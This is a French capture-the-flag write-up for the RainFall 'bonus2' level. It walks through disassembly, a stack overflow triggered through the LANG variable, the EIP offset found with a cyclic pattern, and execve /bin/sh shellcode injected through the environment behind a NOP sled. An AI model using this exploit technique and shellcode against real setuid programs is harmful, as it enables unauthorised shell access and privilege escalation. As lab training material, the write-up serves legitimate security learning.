```
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 test test12
Hello test
bonus2@RainFall:~$ ./bonus2 test test
Hello test
bonus2@RainFall:~$ ./bonus2 test1 test12
Hello test1
```

On observe un binaire attendant 2 arguments et affichant Hello [av1]
On a 2 fonctions, le main ainsi qu'une fonction "greetuser"

```
   0x08048538 <+15>:    cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    eax,0x1
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
```

On recupere le contenu de argc et si ce n'est pas égal à 3 on jump à main+263 pour return 1
Puis il y a un memset sur la chaine de caractere declarée au debut.
2 calls de strncpy sur la meme chaine de caractere (40 puis 32) en utilisqnt les arguments 1 et 2.
```
0x0804859f <+118>:   mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:   cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:   je     0x8048618 <main+239>
```
Puis on call getenv() ce qui parait interessant, on observe une variable globale LANG.
Si le getenv() est égal à 0 alors on quitte.
Et enfin on arrive à la partie qui va nous interesser !

On observe que si l'on a lang = fi ou nl alors dans la fonction greetuser, la chaine va etre plus longue et va segfalt!
Mettons donc notre lange à NL

```
export LANG=nl
gdb ./bonus2
run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
# On a mit 40 A dans le premier argument pour remplir le premier strncpy puis generer la deuxieme chaine avec notre buffer overflow https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
```
On remarque que le programme segfalt bien, puisque l'on observe aucune entrée au shell, on en déduit que l'on devra injecter notre propre shell.
Comme dans un bonus precedent, nous allons donc injecter notre shell dans une variable d'environement et l'appeler via le crash de l'EIP.
On a donc un offset = 23.

Shellcode : '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' # http://shell-storm.org/shellcode/files/shellcode-827.php

```
export LANG=$(python -c 'print("nl" + "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
# Encore une fois, comme avant on rajoute du padding pour etre sur que les arguments n'interfèrent pas
```
